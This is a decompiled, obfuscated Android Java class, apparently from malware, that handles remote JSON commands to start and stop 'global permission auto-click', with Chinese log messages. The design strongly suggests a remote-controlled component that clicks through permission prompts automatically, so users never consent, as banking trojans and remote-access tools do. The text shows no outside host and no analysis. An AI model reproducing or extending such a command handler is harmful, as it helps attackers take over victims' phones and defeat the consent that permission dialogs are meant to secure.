package p000;

import com.storm.safe.rock.service.modules.C0329b4;
import com.storm.safe.rock.service.modules.yw5xud.C0372a9;
import java.util.Set;
import org.json.JSONObject;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* loaded from: classes2.dex */
public final class cn0 implements InterfaceC0726jp {
    static {
        new bn0(null);
    }

    @Override // p000.InterfaceC0726jp
    /* renamed from: a0 */
    public final boolean mo210872a0(String str) {
        return t60.m214690a8(this, str);
    }

    @Override // p000.InterfaceC0726jp
    /* renamed from: a1 */
    public final Set mo210873a1() {
        return kg1.m213542f1("START_GLOBAL_PERMISSION_AUTO_CLICK", "STOP_GLOBAL_PERMISSION_AUTO_CLICK");
    }

    @Override // p000.InterfaceC0726jp
    /* renamed from: a2 */
    public final Object mo210874a2(String str, JSONObject jSONObject, uz0 uz0Var, InterfaceC0876mv interfaceC0876mv) {
        C0372a9 c0372a9;
        if (str.equals("START_GLOBAL_PERMISSION_AUTO_CLICK")) {
            int iOptInt = jSONObject != null ? jSONObject.optInt("timeout", 10) : 10;
            uz0Var.m214886c2(iOptInt);
            t60.m214714d6("PermissionCmdHandler", "[全局权限] 已启动自动点击，超时: " + iOptInt + "秒");
        } else if (str.equals("STOP_GLOBAL_PERMISSION_AUTO_CLICK")) {
            C0329b4 c0329b4 = uz0Var.f60536a0.f52431g2;
            if (c0329b4 != null && (c0372a9 = c0329b4.f53199a4) != null) {
                c0372a9.f55152a9 = false;
                c0372a9.f55153b0 = 0L;
                t60.m214704c5(c0372a9.f55148a5, "🛑 [全局权限] 已停止");
            }
            t60.m214714d6("dqtvuisjd", "🛑 [全局权限] 已停止全局权限自动点击");
            t60.m214714d6("PermissionCmdHandler", "[全局权限] 已停止自动点击");
        }
        return C1351vv.f60710b1;
    }
}
